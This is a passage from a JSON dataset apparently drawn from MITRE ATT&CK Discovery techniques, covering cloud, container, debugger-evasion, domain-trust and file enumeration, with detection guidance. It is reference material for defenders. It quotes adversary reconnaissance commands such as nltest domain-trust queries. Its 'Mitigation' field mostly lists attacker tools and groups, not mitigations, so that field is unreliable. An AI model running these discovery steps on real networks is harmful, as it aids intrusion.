configuration to make the bucket publicly accessible, allowing data to be accessed without authentication. Adversaries have also may use infrastructure discovery APIs such as DescribeDBInstances to determine size, owner, permissions, and network ACLs of database resources. [10] Adversaries can use this information to determine the potential value of databases and discover the requirements to access them. Unlike in Cloud Service Discovery, this technique focuses on the discovery of components of the provided services rather than the services themselves.",
    "Mitigation": [
      {
        "id": "S1091",
        "name": "Pacu",
        "description": "Pacu can enumerate AWS infrastructure, such as EC2 instances.[11]"
      }
    ],
    "Detection": [
      {
        "id": "DS0010",
        "dsource": "Cloud Storage",
        "dcomp": "Cloud Storage Enumeration",
        "detects": "Monitor cloud logs for API calls and other potentially unusual activity related to cloud data object storage enumeration. Discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained."
      },
      {
        "id": "DS0030",
        "dsource": "Instance",
        "dcomp": "Instance Enumeration",
        "detects": "Monitor cloud logs for API calls and other potentially unusual activity related to cloud instance enumeration. Discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained."
      },
      {
        "id": "DS0020",
        "dsource": "Snapshot",
        "dcomp": "Snapshot Enumeration",
        "detects": "Monitor cloud logs for API calls and other potentially unusual activity related to snapshot enumeration. Discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained."
      },
      {
        "id": "DS0034",
        "dsource": "Volume",
        "dcomp": "Volume Enumeration",
        "detects": "Monitor cloud logs for API calls and other potentially unusual activity related to block object storage enumeration. Discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained."
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "Cloud Service Dashboard",
    "Code": "T1538",
    "Description": "An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, findings of potential security risks, and to run additional queries, such as finding public IP addresses and open ports.[1]Depending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This allows the adversary to gain information without making any API requests.",
    "Mitigation": [
      {
        "id": "M1018",
        "name": "User Account Management",
        "description": "Enforce the principle of least-privilege by limiting dashboard visibility to only the resources required. This may limit the discovery value of the dashboard in the event of a compromised account."
      }
    ],
    "Detection": [
      {
        "id": "DS0028",
        "dsource": "Logon Session",
        "dcomp": "Logon Session Creation",
        "detects": "Monitor for newly constructed logon behavior across cloud service management consoles.[2]"
      },
      {
        "id": "DS0002",
        "dsource": "User Account",
        "dcomp": "User Account Authentication",
        "detects": "Correlate other security systems with login information, such as user accounts, IP addresses, and login names.[2]"
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "Cloud Service Discovery",
    "Code": "T1526",
    "Description": "An adversary may attempt to enumerate the cloud services running on a system after gaining access. These methods can differ from platform-as-a-service (PaaS), to infrastructure-as-a-service (IaaS), or software-as-a-service (SaaS). Many services exist throughout the various cloud providers and can include Continuous Integration and Continuous Delivery (CI/CD), Lambda Functions, Azure AD, etc. They may also include security services, such as AWS GuardDuty and Microsoft Defender for Cloud, and logging services, such as AWS CloudTrail and Google Cloud Audit Logs.Adversaries may attempt to discover information about the services enabled throughout the environment. Azure tools and APIs, such as the Azure AD Graph API and Azure Resource Manager API, can enumerate resources and services, including applications, management groups, resources and policy definitions, and their relationships that are accessible by an identity.[1][2]For example, Stormspotter is an open source tool for enumerating and constructing a graph for Azure resources and services, and Pacu is an open source AWS exploitation framework that supports several methods for discovering cloud services.[3][4]Adversaries may use the information gained to shape follow-on behaviors, such as targeting data or credentials from enumerated services or evading identified defenses through Disable or Modify Tools or Disable or Modify Cloud Logs.",
    "Mitigation": [
      {
        "id": "S0677",
        "name": "AADInternals",
        "description": "AADInternals can enumerate information about a variety of cloud services, such as Office 365 and Sharepoint instances or OpenID Configurations.[5]"
      },
      {
        "id": "S1091",
        "name": "Pacu",
        "description": "Pacu can enumerate AWS services, such as CloudTrail and CloudWatch.[4]"
      },
      {
        "id": "S0684",
        "name": "ROADTools",
        "description": "ROADTools can enumerate Azure AD applications and service principals.[6]"
      }
    ],
    "Detection": [
      {
        "id": "DS0025",
        "dsource": "Cloud Service",
        "dcomp": "Cloud Service Enumeration",
        "detects": "Cloud service discovery techniques will likely occur throughout an operation where an adversary is targeting cloud-based systems and services. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities based on the information obtained.Normal, benign system and network events that look like cloud service discovery may be uncommon, depending on the environment and how they are used. Monitor cloud service usage for anomalous behavior that may indicate adversarial presence within the environment."
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "Cloud Storage Object Discovery",
    "Code": "T1619",
    "Description": "Adversaries may enumerate objects in cloud storage infrastructure. Adversaries may use this information during automated discovery to shape follow-on behaviors, including requesting all or specific objects from cloud storage.  Similar to File and Directory Discovery on a local host, after identifying available storage services (i.e. Cloud Infrastructure Discovery) adversaries may access the contents/objects stored in cloud infrastructure.Cloud service providers offer APIs allowing users to enumerate objects stored within cloud storage. Examples include ListObjectsV2 in AWS [1] and List Blobs in Azure[2] .",
    "Mitigation": [
      {
        "id": "S1091",
        "name": "Pacu",
        "description": "Pacu can enumerate AWS storage services, such as S3 buckets and Elastic Block Store volumes.[3]"
      },
      {
        "id": "S0683",
        "name": "Peirates",
        "description": "Peirates can list AWS S3 buckets.[4]"
      }
    ],
    "Detection": [
      {
        "id": "DS0010",
        "dsource": "Cloud Storage",
        "dcomp": "Cloud Storage Access",
        "detects": "Monitor for unusual queries to the cloud provider's storage service. Activity originating from unexpected sources may indicate improper permissions are set that is allowing access to data. Additionally, detecting failed attempts by a user for a certain object, followed by escalation of privileges by the same user, and access to the same object may be an indication of suspicious activity."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Cloud Storage Enumeration",
        "detects": "Monitor cloud logs for API calls used for file or object enumeration for unusual activity. System and network discovery techniques normally occur throughout an operation as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as Collection and Exfiltration, based on the information obtained."
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "Container and Resource Discovery",
    "Code": "T1613",
    "Description": "Adversaries may attempt to discover containers and other resources that are available within a containers environment. Other resources may include images, deployments, pods, nodes, and other information such as the status of a cluster.These resources can be viewed within web applications such as the Kubernetes dashboard or can be queried via the Docker and Kubernetes APIs.[1][2] In Docker, logs may leak information about the environment, such as the environment’s configuration, which services are available, and what cloud provider the victim may be utilizing. The discovery of these resources may inform an adversary’s next steps in the environment, such as how to perform lateral movement and which methods to utilize for execution.",
    "Mitigation": [
      {
        "id": "S0601",
        "name": "Hildegard",
        "description": "Hildegard has used masscan to search for kubelets and the kubelet API for additional running containers.[3]"
      },
      {
        "id": "S0683",
        "name": "Peirates",
        "description": "Peirates can enumerate Kubernetes pods in a given namespace.[4]"
      },
      {
        "id": "G0139",
        "name": "TeamTNT",
        "description": "TeamTNT has checked for running containers with docker ps and for specific container names with docker inspect.[5] TeamTNT has also searched for Kubernetes pods running in a local network.[6]"
      }
    ],
    "Detection": [
      {
        "id": "DS0032",
        "dsource": "Container",
        "dcomp": "Container Enumeration",
        "detects": "Monitor logs for actions that could be taken to gather information about container infrastructure, including the use of discovery API calls by new or unexpected users. Monitor account activity logs to see actions performed and activity associated with the Kubernetes dashboard and other web applications."
      },
      {
        "id": "DS0014",
        "dsource": "Pod",
        "dcomp": "Pod Enumeration",
        "detects": "Monitor logs for actions that could be taken to gather information about pods, including the use of discovery API calls by new or unexpected users. Monitor account activity logs to see actions performed and activity associated with the Kubernetes dashboard and other web applications."
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "Debugger Evasion",
    "Code": "T1622",
    "Description": "Adversaries may employ various means to detect and avoid debuggers. Debuggers are typically used by defenders to trace and/or analyze the execution of potential malware payloads.[1]Debugger evasion may include changing behaviors based on the results of the checks for the presence of artifacts indicative of a debugged environment. Similar to Virtualization/Sandbox Evasion, if the adversary detects a debugger, they may alter their malware to disengage from the victim or conceal the core functions of the implant. They may also search for debugger artifacts before dropping secondary or additional payloads.Specific checks will vary based on the target and/or adversary, but may involve Native API function calls such as IsDebuggerPresent() and  NtQueryInformationProcess(), or manually checking the BeingDebugged flag of the Process Environment Block (PEB). Other checks for debugging artifacts may also seek to enumerate hardware breakpoints, interrupt assembly opcodes, time checks, or measurements if exceptions are raised in the current process (assuming a present debugger would \"swallow\" or handle the potential error).[2][3][4]Adversaries may use the information learned from these debugger checks during automated discovery to shape follow-on behaviors. Debuggers can also be evaded by detaching the process or flooding debug logs with meaningless data via messages produced by looping Native API function calls such as OutputDebugStringW().[5][6]",
    "Mitigation": [
      {
        "id": "S1087",
        "name": "AsyncRAT",
        "description": "AsyncRAT can use the CheckRemoteDebuggerPresent function to detect the presence of a debugger.[7]"
      },
      {
        "id": "S1070",
        "name": "Black Basta",
        "description": "The Black Basta dropper can check system flags, CPU registers, CPU instructions, process timing, system libraries, and APIs to determine if a debugger is present.[8]"
      },
      {
        "id": "S1039",
        "name": "Bumblebee",
        "description": "Bumblebee can search for tools used in static analysis.[9]"
      },
      {
        "id": "S1066",
        "name": "DarkTortilla",
        "description": "DarkTortilla can detect debuggers by using functions such as DebuggerIsAttached and DebuggerIsLogging. DarkTortilla can also detect profilers by verifying the COR_ENABLE_PROFILING environment variable is present and active.[10]"
      },
      {
        "id": "S0694",
        "name": "DRATzarus",
        "description": "DRATzarus can use IsDebuggerPresent to detect whether a debugger is present on a victim.[11]"
      },
      {
        "id": "S1060",
        "name": "Mafalda",
        "description": "Mafalda can search for debugging tools on a compromised host.[12]"
      },
      {
        "id": "C0022",
        "name": "Operation Dream Job",
        "description": "During Operation Dream Job, Lazarus Group used tools that used the IsDebuggerPresent call to detect debuggers.[11]"
      },
      {
        "id": "S0240",
        "name": "ROKRAT",
        "description": "ROKRAT can check for debugging tools.[13][14][15]"
      },
      {
        "id": "S1018",
        "name": "Saint Bot",
        "description": "Saint Bot has used is_debugger_present as part of its environmental checks.[16]"
      },
      {
        "id": "S0595",
        "name": "ThiefQuest",
        "description": "ThiefQuest uses a function named is_debugging to perform anti-debugging logic. The function invokes sysctl checking the returned value of P_TRACED. ThiefQuest also calls ptrace with the PTRACE_DENY_ATTACH flag to prevent debugging.[5]"
      }
    ],
    "Detection": [
      {
        "id": "DS0015",
        "dsource": "Application Log",
        "dcomp": "Application Log Content",
        "detects": "Monitor debugger logs for signs of abnormal and potentially malicious activity."
      },
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments that may employ various means to detect and avoid debugged environments. Detecting actions related to debugger identification may be difficult depending on the adversary's implementation and monitoring required."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls (such as IsDebuggerPresent()) that may employ various means to detect and avoid debugged environments. Detecting actions related to debugger identification may be difficult depending on the adversary's implementation and monitoring required."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitoring for suspicious processes being spawned that gather a variety of system information or perform other forms of Discovery, especially in a short period of time, may aid in detection. Debugger related system checks will likely occur in the first steps of an operation but may also occur throughout as an adversary learns the environment. Data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as lateral movement, based on the information obtained."
      }
    ],
    "Subtechniques": "DefenseEvasion, Discovery"
  },
  {
    "Title": "Device Driver Discovery",
    "Code": "T1652",
    "Description": "Adversaries may attempt to enumerate local device drivers on a victim host. Information about device drivers may highlight various insights that shape follow-on behaviors, such as the function/purpose of the host, present security tools (i.e. Security Software Discovery) or other defenses (e.g., Virtualization/Sandbox Evasion), as well as potential exploitable vulnerabilities (e.g., Exploitation for Privilege Escalation).Many OS utilities may provide information about local device drivers, such as driverquery.exe and the EnumDeviceDrivers() API function on Windows.[1][2] Information about device drivers (as well as associated services, i.e., System Service Discovery) may also be available in the Registry.[3]On Linux/macOS, device drivers (in the form of kernel modules) may be visible within /dev or using utilities such as lsmod and modinfo.[4][5][6]",
    "Mitigation": [
      {
        "id": "S0376",
        "name": "HOPLIGHT",
        "description": "HOPLIGHT can enumerate device drivers located in the registry at HKLM\\Software\\WBEM\\WDM.[7]"
      },
      {
        "id": "S0125",
        "name": "Remsec",
        "description": "Remsec has a plugin to detect active drivers of some security products.[8]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands (lsmod, driverquery, etc.) with arguments highlighting potentially malicious attempts to enumerate device drivers."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls (such as EnumDeviceDrivers()) that may attempt to gather information about local device drivers."
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor processes (lsmod, driverquery.exe, etc.) for events that may highlight potentially malicious attempts to enumerate device drivers."
      },
      {
        "id": "DS0024",
        "dsource": "Windows Registry",
        "dcomp": "Windows Registry Key Access",
        "detects": "Monitor for attempts to access information stored in the Registry about devices and their associated drivers, such as values under HKLM\\SYSTEM\\CurrentControlSet\\Services and HKLM\\SYSTEM\\CurrentControlSet\\HardwareProfiles.[3]"
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "Domain Trust Discovery",
    "Code": "T1482",
    "Description": "Adversaries may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments. Domain trusts provide a mechanism for a domain to allow access to resources based on the authentication procedures of another domain.[1] Domain trusts allow the users of the trusted domain to access resources in the trusting domain. The information discovered may help the adversary conduct SID-History Injection, Pass the Ticket, and Kerberoasting.[2][3] Domain trusts can be enumerated using the DSEnumerateDomainTrusts() Win32 API call, .NET methods, and LDAP.[3] The Windows utility Nltest is known to be used by adversaries to enumerate domain trusts.[4]",
    "Mitigation": [
      {
        "id": "S0552",
        "name": "AdFind",
        "description": "AdFind can gather information about organizational units (OUs) and domain trusts from Active Directory.[5][6][7][8]"
      },
      {
        "id": "S1081",
        "name": "BADHATCH",
        "description": "BADHATCH can use nltest.exe /domain_trusts to discover domain trust relationships on a compromised machine.[9]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar can use Nltest tools to obtain information about the domain.[10][11]"
      },
      {
        "id": "S0521",
        "name": "BloodHound",
        "description": "BloodHound has the ability to map domain trusts and identify misconfigurations for potential abuse.[12]"
      },
      {
        "id": "S1063",
        "name": "Brute Ratel C4",
        "description": "Brute Ratel C4 can use LDAP queries and nltest /domain_trusts for domain trust discovery.[13][14]"
      },
      {
        "id": "C0015",
        "name": "C0015",
        "description": "During C0015, the threat actors used the command nltest /domain_trusts /all_trusts to enumerate domain trusts.[15]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has nltest /domain_trusts to identify domain trust relationships.[16]"
      },
      {
        "id": "S0105",
        "name": "dsquery",
        "description": "dsquery can be used to gather information on domain trusts with dsquery * -filter \"(objectClass=trustedDomain)\" -attr *.[3]"
      },
      {
        "id": "G1006",
        "name": "Earth Lusca",
        "description": "Earth Lusca has used Nltest to obtain information about domain controllers.[17]"
      },
      {
        "id": "S0363",
        "name": "Empire",
        "description": "Empire has modules for enumerating domain trusts.[18]"
      },
      {
        "id": "G0061",
        "name": "FIN8",
        "description": "FIN8 has retrieved a list of trusted domains by using nltest.exe /domain_trusts.[19]"
      },
      {
        "id": "G0059",
        "name": "Magic Hound",
        "description": "Magic Hound has used a web shell to execute nltest /trusted_domains to identify trust relationships.[20]"
      },
      {
        "id": "S0359",
        "name": "Nltest",
        "description": "Nltest may be used to enumerate trusted domains by using commands such as nltest /domain_trusts.[21][22]"
      },
      {
        "id": "S0378",
        "name": "PoshC2",
        "description": "PoshC2 has modules for enumerating domain trusts.[23]"
      },
      {
        "id": "S0194",
        "name": "PowerSploit",
        "description": "PowerSploit has modules such as Get-NetDomainTrust and Get-NetForestTrust to enumerate domain and forest trusts.[24][25]"
      },
      {
        "id": "S0650",
        "name": "QakBot",
        "description": "QakBot can run nltest /domain_trusts /all_trusts for domain trust discovery.[26]"
      },
      {
        "id": "S1071",
        "name": "Rubeus",
        "description": "Rubeus can gather information about domain trusts.[27][28]"
      },
      {
        "id": "C0024",
        "name": "SolarWinds Compromise",
        "description": "During the SolarWinds Compromise, APT29 used the Get-AcceptedDomain PowerShell cmdlet to enumerate accepted domains through an Exchange Management Shell.[29] They also used AdFind to enumerate domains and to discover trust between federated domains.[30][31]"
      },
      {
        "id": "S0266",
        "name": "TrickBot",
        "description": "TrickBot can gather information about domain trusts by utilizing Nltest.[22][32]"
      }
    ],
    "Detection": [
      {
        "id": "DS0017",
        "dsource": "Command",
        "dcomp": "Command Execution",
        "detects": "Monitor executed commands and arguments for actions that could be taken to gather system and network information, such as nltest /domain_trusts. Remote access tools with built-in features may interact directly with the Windows API to gather information."
      },
      {
        "id": "DS0029",
        "dsource": "Network Traffic",
        "dcomp": "Network Traffic Content",
        "detects": "Monitor and analyze traffic patterns and packet inspection associated to LDAP and MSRPC that do not follow the expected protocol standards and traffic flows (e.g extraneous packets that do not belong to established flows, gratuitous or anomalous traffic patterns, anomalous syntax, or structure)."
      },
      {
        "id": "DS0009",
        "dsource": "Process",
        "dcomp": "OS API Execution",
        "detects": "Monitor for API calls associated with gathering information on domain trust relationships that may be used to identify lateral movement like DSEnumerateDomainTrusts() Win32 API call to spot activity associated with Domain Trust Discovery.[3] Information may also be acquired through Windows system management tools such as PowerShell. The .NET method GetAllTrustRelationships() can be an indicator of Domain Trust Discovery.[33]"
      },
      {
        "id": "",
        "dsource": "",
        "dcomp": "Process Creation",
        "detects": "Monitor for newly executed processes that may attempt to gather information on domain trust relationships that may be used to identify lateral movement opportunities in Windows multi-domain/forest environments."
      },
      {
        "id": "DS0012",
        "dsource": "Script",
        "dcomp": "Script Execution",
        "detects": "Monitor for any attempts to enable scripts running on a system would be considered suspicious. If scripts are not commonly used on a system, but enabled, scripts running out of cycle from patching or other administrator functions are suspicious. Scripts should be captured from the file system when possible to determine their actions and intent."
      }
    ],
    "Subtechniques": "\nDiscovery"
  },
  {
    "Title": "File and Directory Discovery",
    "Code": "T1083",
    "Description": "Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from File and Directory Discovery during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions.Many command shell utilities can be used to obtain this information. Examples include dir, tree, ls, find, and locate.[1] Custom tools may also be used to gather file and directory information and interact with the Native API. Adversaries may also leverage a Network Device CLI on network devices to gather file and directory information (e.g. dir, show flash, and/or nvram).[2]",
    "Mitigation": [
      {
        "id": "S0066",
        "name": "3PARA RAT",
        "description": "3PARA RAT has a command to retrieve metadata for files on disk as well as a command to list the current working directory.[3]"
      },
      {
        "id": "S0065",
        "name": "4H RAT",
        "description": "4H RAT has the capability to obtain file and directory listings.[3]"
      },
      {
        "id": "S1028",
        "name": "Action RAT",
        "description": "Action RAT has the ability to collect drive and file information on an infected machine.[4]"
      },
      {
        "id": "G0018",
        "name": "admin@338",
        "description": "admin@338 actors used the following commands after exploiting a machine with LOWBALL malware to obtain information about files and directories: dir c:\\ >> %temp%\\download dir \"c:\\Documents and Settings\" >> %temp%\\download dir \"c:\\Program Files\\\" >> %temp%\\download dir d:\\ >> %temp%\\download[5]"
      },
      {
        "id": "S0045",
        "name": "ADVSTORESHELL",
        "description": "ADVSTORESHELL can list files and directories.[6][7]"
      },
      {
        "id": "S1025",
        "name": "Amadey",
        "description": "Amadey has searched for folders associated with antivirus software.[8]"
      },
      {
        "id": "G1007",
        "name": "Aoqin Dragon",
        "description": "Aoqin Dragon has run scripts to identify file formats including Microsoft Word.[9]"
      },
      {
        "id": "S0622",
        "name": "AppleSeed",
        "description": "AppleSeed has the ability to search for .txt, .ppt, .hwp, .pdf, and .doc files in specified directories.[10]"
      },
      {
        "id": "G0026",
        "name": "APT18",
        "description": "APT18 can list files information for specific directories.[11]"
      },
      {
        "id": "G0007",
        "name": "APT28",
        "description": "APT28 has used Forfiles to locate PDF, Excel, and Word documents during collection. The group also searched a compromised DCCC computer for specific terms.[12][13]"
      },
      {
        "id": "G0022",
        "name": "APT3",
        "description": "APT3 has a tool that looks for files and directories on the local file system.[14][15]"
      },
      {
        "id": "G0050",
        "name": "APT32",
        "description": "APT32's backdoor possesses the capability to list files and directories on a machine. [16]"
      },
      {
        "id": "G0082",
        "name": "APT38",
        "description": "APT38 have enumerated files and directories, or searched in specific locations within a compromised host.[17]"
      },
      {
        "id": "G0087",
        "name": "APT39",
        "description": "APT39 has used tools with the ability to search for files on a compromised host.[18]"
      },
      {
        "id": "G0096",
        "name": "APT41",
        "description": "APT41 has executed file /bin/pwd on exploited victims, perhaps to return architecture related information.[19]"
      },
      {
        "id": "S0456",
        "name": "Aria-body",
        "description": "Aria-body has the ability to gather metadata from a file and to search for file and directory names.[20]"
      },
      {
        "id": "S0438",
        "name": "Attor",
        "description": "Attor has a plugin that enumerates files with specific extensions on all hard disk drives and stores file information in encrypted log files.[21]"
      },
      {
        "id": "S0347",
        "name": "AuditCred",
        "description": "AuditCred can search through folders and files on the system.[22]"
      },
      {
        "id": "S0129",
        "name": "AutoIt backdoor",
        "description": "AutoIt backdoor is capable of identifying documents on the victim with the following extensions: .doc; .pdf, .csv, .ppt, .docx, .pst, .xls, .xlsx, .pptx, and .jpeg.[23]"
      },
      {
        "id": "S0640",
        "name": "Avaddon",
        "description": "Avaddon has searched for specific files prior to encryption.[24]"
      },
      {
        "id": "S0473",
        "name": "Avenger",
        "description": "Avenger has the ability to browse files in directories such as Program Files and the Desktop.[25]"
      },
      {
        "id": "S1053",
        "name": "AvosLocker",
        "description": "AvosLocker has searched for files and directories on a compromised network.[26][27]"
      },
      {
        "id": "S0344",
        "name": "Azorult",
        "description": "Azorult can recursively search for files in folders and collects files from the desktop with certain extensions.[28]"
      },
      {
        "id": "S0638",
        "name": "Babuk",
        "description": "Babuk has the ability to enumerate files on a targeted system.[29][30]"
      },
      {
        "id": "S0414",
        "name": "BabyShark",
        "description": "BabyShark has used dir to search for \"programfiles\" and \"appdata\".[31]"
      },
      {
        "id": "S0475",
        "name": "BackConfig",
        "description": "BackConfig has the ability to identify folders and files related to previous infections.[32]"
      },
      {
        "id": "S0093",
        "name": "Backdoor.Oldrea",
        "description": "Backdoor.Oldrea collects information about available drives, default browser, desktop file list, My Documents, Internet history, program files, and root of available drives. It also searches for ICS-related software files.[33]"
      },
      {
        "id": "S0031",
        "name": "BACKSPACE",
        "description": "BACKSPACE allows adversaries to search for files.[34]"
      },
      {
        "id": "S0642",
        "name": "BADFLICK",
        "description": "BADFLICK has searched for files on the infected host.[35]"
      },
      {
        "id": "S0128",
        "name": "BADNEWS",
        "description": "BADNEWS identifies files with certain extensions from USB devices, then copies them to a predefined directory.[36]"
      },
      {
        "id": "S0337",
        "name": "BadPatch",
        "description": "BadPatch searches for files with specific file extensions.[37]"
      },
      {
        "id": "S0234",
        "name": "Bandook",
        "description": "Bandook has a command to list files on a system.[38]"
      },
      {
        "id": "S0239",
        "name": "Bankshot",
        "description": "Bankshot searches for files on the victim's machine.[39]"
      },
      {
        "id": "S0534",
        "name": "Bazar",
        "description": "Bazar can enumerate the victim's desktop.[40][41]"
      },
      {
        "id": "S0127",
        "name": "BBSRAT",
        "description": "BBSRAT can list file and directory information.[42]"
      },
      {
        "id": "S0268",
        "name": "Bisonal",
        "description": "Bisonal can retrieve a file listing from the system.[43][44]"
      },
      {
        "id": "S1070",
        "name": "Black Basta",
        "description": "Black Basta can enumerate specific files for encryption.[45][46][47][48][49][50][51][52]"
      },
      {
        "id": "S1068",
        "name": "BlackCat",
        "description": "BlackCat can enumerate files for encryption.[53]"
      },
      {
        "id": "S0069",
        "name": "BLACKCOFFEE",
        "description": "BLACKCOFFEE has the capability to enumerate files.[54]"
      },
      {
        "id": "S0089",
        "name": "BlackEnergy",
        "description": "BlackEnergy gathers a list of installed apps from the uninstall program Registry. It also gathers registered mail, browser, and instant messaging clients from the Registry. BlackEnergy has searched for given file types.[55][56]"
      },
      {
        "id": "S0564",
        "name": "BlackMould",
        "description": "BlackMould has the ability to find files on the targeted system.[57]"
      },
      {
        "id": "S0520",
        "name": "BLINDINGCAN",
        "description": "BLINDINGCAN can search, read, write, move, and execute files.[58][59]"
      },
      {
        "id": "S0657",
        "name": "BLUELIGHT",
        "description": "BLUELIGHT can enumerate files and collect associated metadata.[60]"
      },
      {
        "id": "S0635",
        "name": "BoomBox",
        "description": "BoomBox can search for specific files and directories on a machine.[61]"
      },
      {
        "id": "S0651",
        "name": "BoxCaon",
        "description": "BoxCaon has searched for files on the system, such as documents located in the desktop folder.[62]"
      },
      {
        "id": "S0252",
        "name": "Brave Prince",
        "description": "Brave Prince gathers file and directory information from the victim’s machine.[63]"
      },
      {
        "id": "G0060",
        "name": "BRONZE BUTLER",
        "description": "BRONZE BUTLER has collected a list of files from the victim and uploaded it to its C2 server, and then created a new list of specific files to steal.[64]"
      },
      {
        "id": "C0015",
        "name": "C0015",
        "description": "During C0015, the threat actors conducted a file listing discovery against multiple hosts to ensure locker encryption was successful.[65]"
      },
      {
        "id": "S0693",
        "name": "CaddyWiper",
        "description": "CaddyWiper can enumerate all files and directories on a compromised host.[66]"
      },
      {
        "id": "S0351",
        "name": "Cannon",
        "description": "Cannon can obtain victim drive information as well as a list of folders in C:\\Program Files.[67]"
      },
      {
        "id": "S0348",
        "name": "Cardinal RAT",
        "description": "Cardinal RAT checks its current working directory upon execution and also contains watchdog functionality that ensures its executable is located in the correct path (else it will rewrite the payload).[68]"
      },
      {
        "id": "S0572",
        "name": "Caterpillar WebShell",
        "description": "Caterpillar WebShell can search for files in directories.[69]"
      },
      {
        "id": "S1043",
        "name": "ccf32",
        "description": "ccf32 can parse collected files to identify specific file extensions.[70]"
      },
      {
        "id": "S0674",
        "name": "CharmPower",
        "description": "CharmPower can enumerate drives and list the contents of the C: drive on a victim's computer.[71]"
      },
      {
        "id": "S0144",
        "name": "ChChes",
        "description": "ChChes collects the victim's %TEMP% directory path and version of Internet Explorer.[72]"
      },
      {
        "id": "G0114",
        "name": "Chimera",
        "description": "Chimera has utilized multiple commands to identify data of interest in file and directory listings.[73]"
      },
      {
        "id": "S0020",
        "name": "China Chopper",
        "description": "China Chopper's server component can list directory contents.[74][75]"
      },
      {
        "id": "S0023",
        "name": "CHOPSTICK",
        "description": "An older version of CHOPSTICK has a module that monitors all mounted volumes for files with the extensions .doc, .docx, .pgp, .gpg, .m2f, or .m2o.[6]"
      },
      {
        "id": "S0660",
        "name": "Clambling",
        "description": "Clambling can browse directories on a compromised host.[76][77]"
      },
      {
        "id": "S0611",
        "name": "Clop",
        "description": "Clop has searched folders and subfolders for files to encrypt.[78]"
      },
      {
        "id": "S0106",
        "name": "cmd",
        "description": "cmd can be used to find files and directories with native functionality such as dir commands.[79]"
      },
      {
        "id": "S0154",
        "name": "Cobalt Strike",
        "description": "Cobalt Strike can explore files on a compromised system.[80]"
      },
      {
        "id": "G0142",
        "name": "Confucius",
        "description": "Confucius has used a file stealer that checks the Document, Downloads, Desktop, and Picture folders for documents and images with specific extensions.[81]"
      },
      {
        "id": "S0575",
        "name": "Conti",
        "description": "Conti can discover files on a local system.[82]"
      },
      {
        "id": "S0492",
        "name": "CookieMiner",
        "description": "CookieMiner has looked for files in the user's home directory with \"wallet\" in their name using find.[83]"
      },
      {
        "id": "S0212",
        "name": "CORALDECK",
        "description": "CORALDECK searches for specified files.[84]"
      },
      {
        "id": "S0050",
        "name": "CosmicDuke",
        "description": "CosmicDuke searches attached and mounted drives for file extensions and keywords that match a predefined list.[85]"
      },
      {
        "id": "S0488",
        "name": "CrackMapExec",
        "description": "CrackMapExec can discover specified filetypes and log files on a targeted system.[86]"
      },
      {
        "id": "S1023",
        "name": "CreepyDrive",
        "description": "CreepyDrive can specify the local file path to upload files from.[87]"
      },
      {
        "id": "S0115",
        "name": "Crimson",
        "description": "Crimson contains commands to list files and directories, as well as search for files matching certain extensions from a defined list.[88][89][90]"
      },
      {
        "id": "S0235",
        "name": "CrossRAT",
        "description": "CrossRAT can list all files on a system.[91]"
      },
      {
        "id": "S0498",
        "name": "Cryptoistic",
        "description": "Cryptoistic can scan a directory to identify files for deletion.[92]"
      },
      {
        "id": "S0625",
        "name": "Cuba",
        "description": "Cuba can enumerate files by using a variety of functions.[93]"
      },
      {
        "id": "S0687",
        "name": "Cyclops Blink",
        "description": "Cyclops Blink can use the Linux API statvfs to enumerate the current working directory.[94][95]"
      },
      {
        "id": "S0497",
        "name": "Dacls",
        "description": "Dacls can scan directories on a compromised host.[96]"
      },
      {
        "id": "G0070",
        "name": "Dark Caracal",
        "description": "Dark Caracal collected file listings of all default Windows directories.[91]"
      },
      {
        "id": "G0012",
        "name": "Darkhotel",
        "description": "Darkhotel has used malware that searched for files with specific patterns.[97]"
      },
      {
        "id": "S0673",
        "name": "DarkWatchman",
        "description": "DarkWatchman has the ability to enumerate file and folder names.[98]"
      },
      {
        "id": "S0255",
        "name": "DDKONG",
        "description": "DDKONG lists files on the victim’s machine.[99]"
      },
      {
        "id": "S0616",
        "name": "DEATHRANSOM",
        "description": "DEATHRANSOM can use loop operations to enumerate directories on a compromised host.[100]"
      },
      {
        "id": "S0354",
        "name": "Denis",
